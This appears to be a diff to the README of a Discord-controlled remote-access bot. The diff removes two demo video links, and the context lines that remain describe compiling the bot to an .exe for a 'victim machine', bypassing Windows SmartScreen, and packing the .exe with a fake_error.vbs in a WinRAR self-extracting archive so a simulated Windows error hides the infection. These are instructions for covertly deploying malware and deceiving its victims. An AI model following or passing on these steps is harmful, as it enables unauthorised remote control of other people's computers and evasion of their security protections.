@@ -221,10 +221,6 @@ The ``CompilerPYtoEXE.py`` script automates the process of configuring the ``bot
 
     The script will generate the **.exe** file that you can run on the victim machine for the bot to connect to the specified ``Discord`` server.
     
-### Practical video:
-
-https://github.com/user-attachments/assets/d5e40b83-6d99-4d84-95ef-77d46511ccb9
-
 ---
 
 ### 2. **Bypass SmartScreen Lock**
@@ -267,10 +263,6 @@ To make the **.exe** file go unnoticed, the `guiaAutoextraibleEXE.py` file is in
 1. **Prepare the generated `.exe`** file and the `fake_error.vbs` file (in the `buildEXE` folder, simulates a Windows error).
 2. Use **WinRAR** to package both files into a **self-extracting** archive.
 3. The self-extracting file will run and simulate a ``Windows`` error, making the bot go unnoticed.
-
-### Practical video:
-
-https://github.com/user-attachments/assets/1f287107-ead9-4403-a1e7-63d565a0eddb
 
 ---
 
